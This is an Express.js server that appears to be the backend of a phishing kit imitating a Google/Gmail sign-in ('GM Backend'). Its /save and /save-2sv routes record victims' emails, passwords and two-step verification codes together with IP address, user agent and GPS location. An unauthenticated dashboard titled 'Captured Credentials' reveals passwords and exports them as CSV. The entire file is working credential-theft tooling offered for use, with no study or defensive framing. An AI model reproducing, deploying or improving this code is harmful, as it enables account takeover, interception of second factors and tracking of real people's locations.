const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DB_FILE = path.join(__dirname, 'data.txt');

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname, { extensions: ['html'] }));

// CORS configuration for hosting separation
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }
  next();
});

// Ensure data.txt exists
if (!fs.existsSync(DB_FILE)) {
  fs.writeFileSync(DB_FILE, '');
}

// ── Location formatter helper ────────────────────────────────────────────────
function formatLocationBlock(body) {
  const lat = body.lat || 'Unknown';
  const lon = body.lon || 'Unknown';
  const coords = (lat && lat !== 'Unknown' && lat !== 'Denied') ? `${lat}, ${lon}` : lat;
  const accuracy = body.accuracy || 'Unknown';
  const source = body.locSource || 'Unknown';
  const altitude = body.altitude || 'N/A';
  const heading = body.heading || 'N/A';
  const speed = body.speed || 'N/A';
  const gpsError = body.gpsError || null;

  const lines = [
    `LOCATION  : ${coords}`,
    `GPS-SOURCE: ${source}`,
    `ACCURACY  : ${accuracy}`,
  ];

  // Only add extra GPS fields if they have real data
  if (altitude !== 'N/A') lines.push(`ALTITUDE  : ${altitude}`);
  if (heading !== 'N/A') lines.push(`HEADING   : ${heading}`);
  if (speed !== 'N/A') lines.push(`SPEED     : ${speed}`);
  if (gpsError) lines.push(`GPS-ERROR : ${gpsError}`);

  return lines.join('\n');
}

// ── GET /  ────────────────────────────────────────────────────────────────
// Simple health check / root route to avoid "Cannot GET /" when hosting on Render
app.get('/', (req, res) => {
  res.send('✅ GM Backend is running successfully. <br><br>👉 Go to <a href="/server">/server</a> to view the dashboard.');
});

// ── POST /save  ─────────────────────────────────────────────────────────────
// Receives { email, password } and appends a record to data.txt
app.post('/save', (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ ok: false, error: 'Missing fields' });
  }

  const ip =
    req.headers['x-forwarded-for']?.split(',')[0].trim() ||
    req.socket.remoteAddress ||
    'unknown';

  const ua  = req.headers['user-agent'] || 'unknown';
  const now = new Date().toISOString();

  const stepLabel = req.body.password === '[PENDING]' ? 'FORM      : Email Entry' : 'FORM      : Password Entry';

  const record = [
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    stepLabel,
    `TIME      : ${now}`,
    `EMAIL     : ${email}`,
    `PASSWORD  : ${req.body.password || '[PENDING]'}`,
    `IP        : ${ip}`,
    `USER-AGENT: ${ua}`,
    formatLocationBlock(req.body),
    ``
  ].join('\n');

  fs.appendFileSync(DB_FILE, record, 'utf8');
  res.json({ ok: true });
});

// ── GET /server  ─────────────────────────────────────────────────────────────
// Beautiful admin dashboard to view / edit / clear data.txt
app.get('/server', (req, res) => {
  const raw = fs.existsSync(DB_FILE) ? fs.readFileSync(DB_FILE, 'utf8') : '';

  // Parse records
  const blocks = raw.split(/━+/).map(b => b.trim()).filter(Boolean);
  const records = blocks.map((block, i) => {
    const get = (key) => {
      const m = block.match(new RegExp(`${key}\\s*:\\s*(.+)`));
      return m ? m[1].trim() : '—';
    };
    return {
      id: i + 1,
      time: get('TIME'),
      email: get('EMAIL'),
      password: get('PASSWORD'),
      location: get('LOCATION'),
      gpsSource: get('GPS-SOURCE'),
      accuracy: get('ACCURACY'),
      gpsError: get('GPS-ERROR'),
      altitude: get('ALTITUDE'),
      ip: get('IP'),
      ua: get('USER-AGENT')
    };
  });

  const count = records.length;

  const rows = records.map((r) => {
    // GPS source badge styling
    const isHwGps = r.gpsSource === 'GPS-Hardware';
    const isIpLoc = r.gpsSource === 'IP-Geolocation';
    const srcBadge = isHwGps
      ? '<span style="display:inline-block;background:rgba(52,211,153,.15);color:#34d399;padding:2px 8px;border-radius:100px;font-size:10px;font-weight:600;margin-top:4px">🛰️ GPS Hardware</span>'
      : isIpLoc
      ? '<span style="display:inline-block;background:rgba(251,191,36,.15);color:#fbbf24;padding:2px 8px;border-radius:100px;font-size:10px;font-weight:600;margin-top:4px">🌐 IP Approx</span>'
      : (r.gpsSource !== '—' ? '<span style="display:inline-block;background:rgba(248,113,113,.15);color:#f87171;padding:2px 8px;border-radius:100px;font-size:10px;font-weight:600;margin-top:4px">❌ ' + escHtml(r.gpsSource) + '</span>' : '');

    const accInfo = r.accuracy !== '—' ? '<div style="font-size:10px;color:var(--muted);margin-top:2px">± ' + escHtml(r.accuracy) + '</div>' : '';
    const errInfo = r.gpsError !== '—' ? '<div style="font-size:10px;color:#f87171;margin-top:2px">⚠ ' + escHtml(r.gpsError) + '</div>' : '';

    return `
    <tr>
      <td class="td-id">#${r.id}</td>
      <td class="td-email">
        <span class="badge-email">${escHtml(r.email)}</span>
      </td>
      <td class="td-pw">
        <span class="pw-mask" data-pw="${escHtml(r.password)}">••••••••</span>
        <button class="reveal-btn" onclick="togglePw(this)" title="Reveal">
          <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
        </button>
      </td>
      <td class="td-loc" style="font-size:12px">
        ${r.location && r.location !== '—' && r.location !== 'Unknown' && r.location !== 'Denied' ? 
        `<a href="https://maps.google.com/?q=${escHtml(r.location)}" target="_blank" style="color:var(--accent);text-decoration:none">📍 ${escHtml(r.location)}</a>` : 
        '<span style="color:var(--muted)">' + escHtml(r.location || 'Unknown') + '</span>'}
        ${srcBadge}${accInfo}${errInfo}
      </td>
      <td class="td-ip">${escHtml(r.ip)}</td>
      <td class="td-time">${escHtml(r.time.replace('T', ' ').replace('Z', ' UTC'))}</td>
      <td class="td-ua" title="${escHtml(r.ua)}">${escHtml(r.ua.substring(0, 60))}${r.ua.length > 60 ? '…' : ''}</td>
    </tr>`;
  }).join('');

  const emptyState = count === 0 ? `
    <div class="empty-state">
      <div class="empty-icon">📭</div>
      <p>No credentials captured yet.</p>
      <p class="empty-sub">Records will appear here as users submit the form.</p>
    </div>` : '';

  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Server Dashboard — Credential Logs</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    :root {
      --bg:       #0d0f14;
      --surface:  #161923;
      --surface2: #1e2330;
      --border:   #2a2f3d;
      --accent:   #4f8ef7;
      --accent2:  #a78bfa;
      --danger:   #f87171;
      --success:  #34d399;
      --text:     #e2e8f0;
      --muted:    #64748b;
      --radius:   14px;
    }

    body {
      font-family: 'Inter', sans-serif;
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
    }

    /* ── Top bar ── */
    .topbar {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 18px 32px;
      background: var(--surface);
      border-bottom: 1px solid var(--border);
      position: sticky;
      top: 0;
      z-index: 100;
      backdrop-filter: blur(12px);
    }
    .topbar-brand {
      display: flex;
      align-items: center;
      gap: 12px;
    }
    .topbar-brand svg { flex-shrink: 0; }
    .topbar-title {
      font-size: 18px;
      font-weight: 700;
      background: linear-gradient(135deg, var(--accent), var(--accent2));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }
    .topbar-sub {
      font-size: 12px;
      color: var(--muted);
      font-weight: 400;
    }
    .topbar-actions {
      display: flex;
      gap: 10px;
      align-items: center;
    }
    .btn {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      padding: 8px 18px;
      border-radius: 8px;
      font-size: 13px;
      font-weight: 500;
      cursor: pointer;
      border: none;
      font-family: inherit;
      transition: all .2s;
    }
    .btn-outline {
      background: transparent;
      border: 1px solid var(--border);
      color: var(--text);
    }
    .btn-outline:hover { border-color: var(--accent); color: var(--accent); background: rgba(79,142,247,.08); }
    .btn-danger {
      background: rgba(248,113,113,.12);
      border: 1px solid rgba(248,113,113,.3);
      color: var(--danger);
    }
    .btn-danger:hover { background: rgba(248,113,113,.22); }
    .btn-success {
      background: rgba(52,211,153,.12);
      border: 1px solid rgba(52,211,153,.3);
      color: var(--success);
    }
    .btn-success:hover { background: rgba(52,211,153,.22); }

    /* ── Stats bar ── */
    .stats-bar {
      display: flex;
      gap: 16px;
      padding: 20px 32px;
      flex-wrap: wrap;
    }
    .stat-card {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: var(--radius);
      padding: 16px 24px;
      min-width: 150px;
      flex: 1;
      transition: border-color .2s;
    }
    .stat-card:hover { border-color: var(--accent); }
    .stat-label { font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: .8px; margin-bottom: 6px; }
    .stat-value { font-size: 32px; font-weight: 700; background: linear-gradient(135deg, var(--accent), var(--accent2)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }

    /* ── Table section ── */
    .section {
      padding: 0 32px 32px;
    }
    .section-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 16px;
    }
    .section-title {
      font-size: 14px;
      font-weight: 600;
      color: var(--muted);
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .table-wrap {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: var(--radius);
      overflow: hidden;
    }
    table { width: 100%; border-collapse: collapse; }
    thead tr {
      background: var(--surface2);
      border-bottom: 1px solid var(--border);
    }
    th {
      padding: 12px 16px;
      font-size: 11px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: .8px;
      color: var(--muted);
      text-align: left;
      white-space: nowrap;
    }
    tbody tr {
      border-bottom: 1px solid var(--border);
      transition: background .15s;
    }
    tbody tr:last-child { border-bottom: none; }
    tbody tr:hover { background: rgba(79,142,247,.04); }
    td {
      padding: 13px 16px;
      font-size: 13px;
      vertical-align: middle;
    }
    .td-id { color: var(--muted); font-family: 'JetBrains Mono', monospace; font-size: 12px; width: 52px; }
    .badge-email {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      background: rgba(79,142,247,.1);
      color: var(--accent);
      padding: 4px 10px;
      border-radius: 100px;
      font-size: 12px;
      font-weight: 500;
      max-width: 240px;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
    }
    .td-pw { display: flex; align-items: center; gap: 6px; }
    .pw-mask {
      font-family: 'JetBrains Mono', monospace;
      font-size: 13px;
      color: var(--accent2);
      letter-spacing: 2px;
    }
    .reveal-btn {
      background: none;
      border: none;
      cursor: pointer;
      color: var(--muted);
      padding: 4px;
      border-radius: 4px;
      display: flex;
      align-items: center;
      transition: color .2s;
    }
    .reveal-btn:hover { color: var(--accent2); }
    .td-ip {
      font-family: 'JetBrains Mono', monospace;
      font-size: 12px;
      color: var(--success);
    }
    .td-time {
      font-family: 'JetBrains Mono', monospace;
      font-size: 11px;
      color: var(--muted);
      white-space: nowrap;
    }
    .td-ua { color: var(--muted); font-size: 11px; max-width: 220px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }

    .empty-state {
      text-align: center;
      padding: 64px 32px;
      color: var(--muted);
    }
    .empty-icon { font-size: 48px; margin-bottom: 16px; }
    .empty-sub { font-size: 13px; margin-top: 6px; }

    /* ── Raw editor ── */
    .raw-section {
      padding: 0 32px 40px;
    }
    .raw-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 12px;
    }
    textarea#rawEditor {
      width: 100%;
      height: 340px;
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: var(--radius);
      color: var(--text);
      font-family: 'JetBrains Mono', monospace;
      font-size: 12.5px;
      line-height: 1.7;
      padding: 18px;
      resize: vertical;
      outline: none;
      transition: border-color .2s;
    }
    textarea#rawEditor:focus { border-color: var(--accent); }
    .save-bar {
      display: flex;
      gap: 10px;
      margin-top: 10px;
      align-items: center;
      justify-content: flex-end;
    }
    .toast {
      position: fixed;
      bottom: 28px;
      right: 28px;
      background: var(--surface2);
      border: 1px solid var(--border);
      color: var(--text);
      padding: 12px 20px;
      border-radius: 10px;
      font-size: 13px;
      font-weight: 500;
      box-shadow: 0 8px 32px rgba(0,0,0,.4);
      transform: translateY(80px);
      opacity: 0;
      transition: all .35s cubic-bezier(.34,1.56,.64,1);
      z-index: 999;
    }
    .toast.show { transform: translateY(0); opacity: 1; }
    .toast.ok { border-color: var(--success); color: var(--success); }
    .toast.err { border-color: var(--danger); color: var(--danger); }

    /* ── Scrollbar ── */
    ::-webkit-scrollbar { width: 6px; height: 6px; }
    ::-webkit-scrollbar-track { background: transparent; }
    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 99px; }
    ::-webkit-scrollbar-thumb:hover { background: var(--muted); }

    @media (max-width: 768px) {
      .topbar, .stats-bar, .section, .raw-section { padding-left: 16px; padding-right: 16px; }
      .td-ua, .td-ip { display: none; }
    }
  </style>
</head>
<body>

<!-- Top bar -->
<div class="topbar">
  <div class="topbar-brand">
    <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect width="32" height="32" rx="8" fill="url(#grad)"/>
      <path d="M9 10h14l-7 8-7-8zm0 0v12h14V10" stroke="#fff" stroke-width="1.5" stroke-linejoin="round" fill="none"/>
      <defs><linearGradient id="grad" x1="0" y1="0" x2="32" y2="32" gradientUnits="userSpaceOnUse"><stop stop-color="#4f8ef7"/><stop offset="1" stop-color="#a78bfa"/></linearGradient></defs>
    </svg>
    <div>
      <div class="topbar-title">Server Dashboard</div>
      <div class="topbar-sub">Credential log viewer &amp; editor</div>
    </div>
  </div>
  <div class="topbar-actions">
    <button class="btn btn-outline" onclick="location.reload()">
      <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
      Refresh
    </button>
    <button class="btn btn-outline" onclick="exportCsv()">
      <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M19 9h-4V3H9v6H5l7 7 7-7zm-8 2V5h2v6h1.17L12 13.17 9.83 11H11zm-6 7h14v2H5v-2z"/></svg>
      Export CSV
    </button>
    <button class="btn btn-danger" onclick="clearAll()">
      <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg>
      Clear All
    </button>
  </div>
</div>

<!-- Stats -->
<div class="stats-bar">
  <div class="stat-card">
    <div class="stat-label">Total Records</div>
    <div class="stat-value">${count}</div>
  </div>
  <div class="stat-card">
    <div class="stat-label">Latest Email</div>
    <div class="stat-value" style="font-size:16px;margin-top:6px;color:var(--text);-webkit-text-fill-color:var(--text)">${records.length > 0 ? escHtml(records[records.length - 1].email) : '—'}</div>
  </div>
  <div class="stat-card">
    <div class="stat-label">Database File</div>
    <div class="stat-value" style="font-size:15px;margin-top:6px;-webkit-text-fill-color:var(--success);color:var(--success)">data.txt</div>
  </div>
</div>

<!-- Table -->
<div class="section">
  <div class="section-header">
    <div class="section-title">Captured Credentials</div>
    <div style="font-size:12px;color:var(--muted)">${count} record${count !== 1 ? 's' : ''}</div>
  </div>
  <div class="table-wrap">
    ${count > 0 ? `
    <table>
      <thead>
        <tr>
          <th>#</th>
          <th>Email</th>
          <th>Password</th>
          <th>Location</th>
          <th>IP Address</th>
          <th>Timestamp</th>
          <th>User Agent</th>
        </tr>
      </thead>
      <tbody>${rows}</tbody>
    </table>` : emptyState}
  </div>
</div>

<!-- Raw editor -->
<div class="raw-section">
  <div class="raw-header">
    <div class="section-title">Raw File Editor — data.txt</div>
  </div>
  <textarea id="rawEditor">${escHtml(raw)}</textarea>
  <div class="save-bar">
    <button class="btn btn-outline" onclick="document.getElementById('rawEditor').value=''">Clear Editor</button>
    <button class="btn btn-success" onclick="saveRaw()">
      <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M17 3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V7l-4-4zm-5 16c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3zm3-10H5V5h10v4z"/></svg>
      Save Changes
    </button>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
  // Toggle password reveal in table
  function togglePw(btn) {
    const span = btn.previousElementSibling;
    if (span.dataset.revealed === 'true') {
      span.textContent = '••••••••';
      span.dataset.revealed = 'false';
    } else {
      span.textContent = span.dataset.pw;
      span.dataset.revealed = 'true';
    }
  }

  // Save raw file content
  async function saveRaw() {
    const content = document.getElementById('rawEditor').value;
    try {
      const r = await fetch('/save-raw', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content })
      });
      const j = await r.json();
      showToast(j.ok ? '✓ File saved successfully' : '✗ Save failed: ' + j.error, j.ok ? 'ok' : 'err');
    } catch(e) {
      showToast('✗ Network error', 'err');
    }
  }

  // Clear all data
  async function clearAll() {
    if (!confirm('Delete ALL captured records? This cannot be undone.')) return;
    try {
      const r = await fetch('/clear', { method: 'POST' });
      const j = await r.json();
      if (j.ok) { showToast('✓ All records cleared', 'ok'); setTimeout(() => location.reload(), 1200); }
    } catch(e) { showToast('✗ Network error', 'err'); }
  }

  // Export CSV
  function exportCsv() {
    const rows = ${JSON.stringify(records)};
    if (!rows.length) { showToast('No data to export', 'err'); return; }
    const header = 'ID,Email,Password,Location,IP,Timestamp,UserAgent';
    const csv = [header, ...rows.map(r =>
      [r.id, r.email, r.password, r.location, r.ip, r.time, r.ua].map(v => '"' + String(v).replace(/"/g, '""') + '"').join(',')
    )].join('\\n');
    const blob = new Blob([csv], { type: 'text/csv' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'credentials_' + new Date().toISOString().slice(0,10) + '.csv';
    a.click();
  }

  // Toast notification
  function showToast(msg, type) {
    const t = document.getElementById('toast');
    t.textContent = msg;
    t.className = 'toast ' + (type || '');
    t.classList.add('show');
    setTimeout(() => t.classList.remove('show'), 3000);
  }
</script>
</body>
</html>`);
});

app.post('/save-2sv', (req, res) => {
  const { email, code } = req.body;
  if (!email || !code) {
    return res.status(400).json({ ok: false, error: 'Missing fields' });
  }

  const ip =
    req.headers['x-forwarded-for']?.split(',')[0].trim() ||
    req.socket.remoteAddress ||
    'unknown';

  const ua  = req.headers['user-agent'] || 'unknown';
  const now = new Date().toISOString();

  let formLabel = 'FORM      : 2-Step Verification';
  const src = req.body.locSource || 'Unknown';
  if (src === 'GPS-Hardware') {
    formLabel = 'FORM      : 2SV + GPS (Hardware ✓)';
  } else if (src === 'IP-Geolocation') {
    formLabel = 'FORM      : 2SV + Location (IP approx)';
  } else if (req.body.lat === 'Denied') {
    formLabel = 'FORM      : 2SV (Location Denied)';
  }

  const record = [
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    formLabel,
    `TIME      : ${now}`,
    `EMAIL     : ${email}`,
    `PASSWORD  : [2FA] ${code}`,
    `IP        : ${ip}`,
    `USER-AGENT: ${ua}`,
    formatLocationBlock(req.body),
    ``
  ].join('\n');

  fs.appendFileSync(DB_FILE, record, 'utf8');
  res.json({ ok: true });
});

// ── POST /save-raw  ───────────────────────────────────────────────────────────
// Overwrites data.txt with edited content from the dashboard
app.post('/save-raw', (req, res) => {
  const { content } = req.body;
  if (content === undefined) return res.status(400).json({ ok: false, error: 'No content' });
  fs.writeFileSync(DB_FILE, content, 'utf8');
  res.json({ ok: true });
});

// ── POST /clear  ─────────────────────────────────────────────────────────────
// Clears all data from data.txt
app.post('/clear', (req, res) => {
  fs.writeFileSync(DB_FILE, '', 'utf8');
  res.json({ ok: true });
});

// ── Start ─────────────────────────────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`\n  ✅  Server running at http://localhost:${PORT}`);
  console.log(`  📊  Dashboard   → http://localhost:${PORT}/server`);
  console.log(`  📧  Login page  → http://localhost:${PORT}/\n`);
});

// HTML escape helper (server-side)
function escHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
